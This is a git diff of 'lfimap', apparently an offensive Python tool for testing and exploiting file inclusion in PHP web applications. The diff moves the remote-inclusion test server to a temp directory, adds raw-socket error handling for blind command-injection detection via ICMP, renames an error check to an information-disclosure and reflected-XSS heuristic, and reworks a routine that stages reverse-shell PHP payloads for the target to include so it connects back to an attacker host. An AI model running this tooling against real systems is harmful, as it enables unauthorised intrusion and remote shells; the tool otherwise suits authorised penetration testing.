@@ -25,23 +25,29 @@ from argparse import RawTextHelpFormatter
 
 exploits = []
 proxies = {}
-rfi_test_port = 443
+rfi_test_port = 8000
 scriptName = ""
 tempArg = ""
+webDir = ""
 
 class ServerHandler(http.server.SimpleHTTPRequestHandler):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, directory=webDir, **kwargs)
     def log_message(self, format, *args):
         pass
 
 def serve_forever():
+    global webDir
+    
     socketserver.TCPServer.allow_reuse_address = True
     try:
         with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:
-
             if(args.verbose):
                 print("[i] Opening local web server on port " +  str(rfi_test_port) + " and setting up 'rfitest' that will be used as test inclusion")
+            
+            rfiTestPath = webDir + os.path.sep + "rfitest"
 
-            with open("rfitest", "w") as tempf:
+            with open(rfiTestPath, "w") as tempf:
                 tempf.write("<html>\n")
                 tempf.write("961bb08a95dbc34397248d92352da799\n")
                 tempf.write("<?php\n")
@@ -61,7 +67,7 @@ def serve_forever():
                 httpd.server_close()
     except:
         print("[!] Cannot setup local web server on port " + str(rfi_test_port) + ", it's in use or unavailable! Skipping RFI check...")
-        pass
+        raise
 
 class ICMPThread(threading.Thread):
     def __init__(self):
@@ -69,15 +75,18 @@ class ICMPThread(threading.Thread):
         self.result = None
 
     def run(self):
-        s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
-        s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
-        self.result = False
+        try:
+            s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
+            s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
+            self.result = False
 
-        while True:
-            data, addr = s.recvfrom(1024)
-            #icmp = data[20:28]
-            if(data):
-                self.result = True
+            while True:
+                data, addr = s.recvfrom(1024)
+                if(data):
+                    self.result = True
+        except PermissionError:
+            if(args.verbose):
+                print("[-] Raw socket access is not allowed. For blind ICMP test, rerun lfimap as admin/sudo.")
 
     def getResult(self):
         return self.result
@@ -265,8 +274,8 @@ def test_cmd_injection(url):
      # ICMP exfiltration technique
     if(args.lhost):
         if(args.verbose):
-            print("[i] Testing for blind OS command injection via ICMP exfiltration&listener...")
-
+            print("[i] Testing for blind OS command injection via ICMP exfiltration...")
+            
         t = ICMPThread()
         t.start()
 
@@ -291,7 +300,6 @@ def test_cmd_injection(url):
                     t.setResult(False)
                     if(init(res, "GET", "RCE", u, "", headers, "CMD", True)):
                         return
-
 
 def test_xss(url):
     if(args.verbose):
@@ -461,12 +469,30 @@ def test_expect(url):
     return
 
 def test_rfi(url):
+    global webDir
+
     if(args.verbose):
         print("[i] Testing remote file inclusion...")
     
     #Localhost RFI test
     if(args.lhost):
-        try:
+        try:  
+            # GET WEB DIRECTORY LOCATION
+            if(sys.platform == "linux"):
+                if(os.path.isdir("/tmp")):
+                    if(os.access("/tmp", os.W_OK)):
+                        webDir = "/tmp" 
+                else:
+                    print("Directory /tmp can't be accessed. Cannot setup local web server for RFI test.")
+                    raise
+            else:
+                if(os.path.isdir(os.environ['TEMP'])):
+                    if(os.access(os.environ['TEMP'], os.W_OK)):
+                        webDir = os.environ['TEMP']
+                else:
+                    print("%TEMP% directory can't be accessed. Cannot setup local web server for RFI test.")
+                    raise
+
             threading.Thread(target=serve_forever).start()
             test = "http://{0}:{1}/rfitest".format(args.lhost, str(rfi_test_port))
             u = url.replace(args.param, test)
@@ -496,7 +522,7 @@ def test_rfi(url):
     except:
         pass
 
-def test_errors(url):
+def test_heuristics(url):
     if(args.verbose):
         print("[i] Testing for info disclosure using heuristics...")
 
@@ -504,25 +530,50 @@ def test_errors(url):
     tests.append("/?!%$$%!?/")
     
     errors = ["Warning", "include_path"]
+    temp = headers.copy()
+    temp['User-Agent'] = "lfimap<>ua"
+    temp['Referer'] = "lfimap<>referer"
+
 
     if(not args.postreq):
         for test in tests:
             u = url.replace(args.param, test)
-            res = requests.get(u,  headers = headers, proxies = proxies)
+            res = requests.get(u,  headers = temp, proxies = proxies)
             if(errors[0] in res.text and errors[1] in res.text):
-                print("[+] Possible LFI ->  error triggered -> '" + u + "'")
-                if("C:" in res.text or "D:" in res.text):
+                if("C:" in res.text or "D:" in res.text or "windows" in res.text.lower()):
                     print("[i] Detected windows OS signatures, based on response.")
+                print("[+] Possible LFI ->  error triggered -> '" + u + "'")
     else:
         for test in tests:
             postTest = args.postreq.replace(args.param, test)
-            req = requests.post(url, headers = headers, data = postTest, proxies = proxies)
+            res = requests.post(url, headers = temp, data = postTest, proxies = proxies)
             
-            if(errors[0] in req.text and errors[1] in req.text):
-                print("[+] Possible LFI error triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
+            if(errors[0] in res.text and errors[1] in res.text):
                 if("/php" in res.text):
                     print("[i] Detected linux OS signatures, based on response.")
-        return
+                print("[+] Possible LFI error triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
+        
+    if("Server" in res.headers):
+        print("[+] Possible web server version disclosure: " + res.headers['Server'])
+    
+    resHeaders = "".join(res.headers).lower()
+    if("x-Powered-by" in resHeaders):
+        print("[+] Possible disclosure of underlying web server languages discovered: " + res.headers['X-Powered-By'])
+    if("phpsessid" in resHeaders):  
+        print("[+] Discovered possible PHP signatures.")
+    if("jsessid" in resHeaders or "jsessionid" in resHeaders):
+        print("[+] Discovered possible JAVA signatures.")
+    if("aspnet" in resHeaders):
+        print("[+] Discovered possible .NET signatures.")
+    if("set-cookie:" in resHeaders and "httponly" not in resHeaders):
+        print("[+] Cookies are set without 'HttpOnly' tag.")
+    if("lfimap<>ua" in res.text):
+        print("[+] Possible XSS, reflected 'User-Agent' string discovered in response.")
+    if("lfimap<>referer" in res.text):
+        print("[+] Possible XSS, reflected 'Referer' string discovered in response.")
+
+    print("")
+    return
 
 
 #Checks if sent payload is executed, if any of the below keywords are in the response, returns True
@@ -872,25 +923,25 @@ def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
 
 def exploit_rfi(exploit, method, ip, port):
     
-    os = exploit['OS']
     url = exploit['GETVAL']
     printInfo(ip, port, "php", "Remote File Inclusion")
     
+    includeServer = ""
+
     if(not args.postreq):
         if(exploit['OS'] == "windows"):
-            prepareRfiExploit("exploits/reverse_shell_win.php", "reverse_shell_win_tmp.php", ip, port)
-            res = requests.get(url.replace(tempArg, "/reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit("exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port)
+            res = requests.get(url.replace(tempArg, includeServer + "reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
         else:
-            prepareRfiExploit("exploits/reverse_shell_lin.php", "reverse_shell_lin_tmp.php", ip, port)
-            print(url.replace(tempArg, "/reverse_shell_lin_tmp.php"))
-            res = requests.get(url.replace(tempArg, "/reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit("exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
+            res = requests.get(url.replace(tempArg, includeServer + "reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
     else:
         if(exploit['OS'] == "linux"):
-            prepareRfiExploit("exploits/reverse_shell_lin.php", "reverse_shell_lin_tmp.php", ip, port)
-            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, "/reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit("exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
+            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, includeServer +  "reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
         else:
-            prepareRfiExploit("exploits/reverse_shell_win.php", "reverse_shell_win_tmp.php", ip, port) 
-            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, "/reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit("exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port) 
+            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, includeServer + "reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
     return
 
 
@@ -1004,13 +1055,13 @@ def pwn(exploit):
 
 #Cleans up all created files during testing
 def lfimap_cleanup():
-    if(os.path.exists("rfitest")):
-        os.remove("rfitest")
+    if(os.path.exists(webDir + os.path.sep + "rfitest")):
+        os.remove(webDir + os.path.sep + "rfitest")
     
-    if(os.path.exists("reverse_shell_lin_tmp.php")):
-        os.remove("reverse_shell_lin_tmp.php")
-    if(os.path.exists("reverse_shell_win_tmp.php")):
-        os.remove("reverse_shell_win_tmp.php")
+    if(os.path.exists(webDir + os.path.sep + "reverse_shell_lin_tmp.php")):
+        os.remove(webDir + os.path.sep + "reverse_shell_lin_tmp.php")
+    if(os.path.exists(webDir + os.path.sep + "reverse_shell_win_tmp.php")):
+        os.remove(webDir + os.path.sep + "reverse_shell_win_tmp.php")
     os._exit(0)
 
 def main():
@@ -1022,7 +1073,7 @@ def main():
 
     #Perform all tests
     if(args.test_all):
-        test_errors(url)
+        test_heuristics(url)
         test_filter(url)
         test_input(url)
         test_data(url)
@@ -1037,6 +1088,10 @@ def main():
         lfimap_cleanup()
 
     default = True
+    
+    if(args.heuristics):
+        default = False
+        test_heuristics(url)
     if(args.php_filter):
         default = False
         test_filter(url)
@@ -1064,11 +1119,9 @@ def main():
     if(args.xss):
         default = False
         test_xss(url)
-        
     
     #Default behaviour
     if(default):
-        test_errors(url)
         test_filter(url)
         test_input(url)
         test_data(url)
@@ -1107,7 +1160,8 @@ if(__name__ == "__main__"):
     attackGroup.add_argument('-r', '--rfi', action = 'store_true', dest = 'rfi', help='\t\t Attack using remote file inclusion')
     attackGroup.add_argument('-c', '--cmd', action = 'store_true', dest = 'cmd', help='\t\t Attack using command injection')
     attackGroup.add_argument('--file', action = 'store_true', dest='file', help='\t\t Attack using file:// wrapper')
-    attackGroup.add_argument('--xss', action = 'store_true', dest = 'xss', help='\t\t Cross site scripting test')
+    attackGroup.add_argument('--xss', action = 'store_true', dest = 'xss', help='\t\t Test for reflected XSS')
+    attackGroup.add_argument('--info', action= 'store_true', dest= 'heuristics', help= '\t\t Test for basic information disclosures')
     attackGroup.add_argument('-a', '--all', action = 'store_true', dest = 'test_all', help='\t\t Use all available methods to attack')
     
     payloadGroup = parser.add_argument_group('PAYLOAD OPTIONS')
@@ -1143,29 +1197,21 @@ if(__name__ == "__main__"):
     if(not args.cookie):
         print("[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
     
-    #Checks if any parameter is selected for testin
-    if(mode == "get"):
-        if(args.param not in url):
-            print("[-] '" + args.param + "' is not found in the URL. Please specify it as a parameter value for testing. Exiting...\n")
-            sys.exit(-1)
-    else:
-        if(args.param not in args.postreq):
-            print("[-] '" + args.param + "' is not found in POST data. Please specify it inside '-D' parameter. Exiting...\n")
-            sys.exit(-1)
+    if(args.php_filter or args.php_input or args.php_data or args.php_expect or args.trunc or args.rfi or args.cmd or args.file or args.xss or args.test_all or not args.heuristics):
+        # Checks if any parameter is selected for testing
+        if(mode == "get"):
+            if(args.param not in url):
+                print("[-] '" + args.param + "' is not found in the URL. Please specify it as a parameter value for testing. Exiting...\n")
+                sys.exit(-1)
+        else:
+            if(args.param not in args.postreq):
+                print("[-] '" + args.param + "' is not found in POST data. Please specify it inside '-D' parameter. Exiting...\n")
+                sys.exit(-1)
         
-        if(args.param in args.url):
-            print("[-] Cannot do POST and GET mode testing at once. '-D' is specified for POST testing with '" +args.param + "' in URL. Exiting...\n")
-            sys.exit(-1)
+            if(args.param in args.url):
+                print("[-] Cannot do POST and GET mode testing at once. Exiting...\n")
+                sys.exit(-1)
 
-    if(args.test_all or args.rfi):
-        if("nt" not in os.name and "win" not in sys.platform):
-            if(os.getuid() != 0):
-                print("[-] Please run lfimap as admin/root for RFI test. Exiting...")
-                sys.exit()
-            if(not args.lhost):
-                print("[!] Lfimap will try to test RFI using remote site. If target is in your network, specify '--lhost' parameter for local web server file inclusion.\n")
-
-    
     #If testing using GET this checks if provided URL is valid
     urlRegex = re.compile(
     r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
@@ -1272,3 +1318,4 @@ if(__name__ == "__main__"):
             else:
                 addHeader(args.httpheaders[i].split(":",1)[0].replace(" ",""), args.httpheaders[i].split(":",1)[1].replace(" ", ""))
     main()
+
